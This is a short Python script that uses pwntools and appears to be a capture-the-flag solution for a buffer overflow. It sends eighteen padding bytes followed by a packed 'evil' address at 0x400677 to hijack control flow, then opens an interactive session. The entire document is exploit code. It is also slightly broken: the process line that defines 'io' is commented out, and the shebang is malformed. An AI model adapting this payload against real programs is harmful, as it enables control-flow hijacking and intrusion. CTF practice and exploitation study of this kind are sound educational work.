#/usr/bin/python

from  pwn import *

context.arch = "amd64"
#io = process('./')
io.recvuntil('Input:\n')
#r.send('/bin/sh\x00')
evil_adr = 0x0000000000400677
print ('A'*18) + p64(evil_adr)
io.sendline(('A'*18) + p64(evil_adr))
#print r.recvuntil('\n')
#print io.recv()
#raw_input('@')
io.interactive()
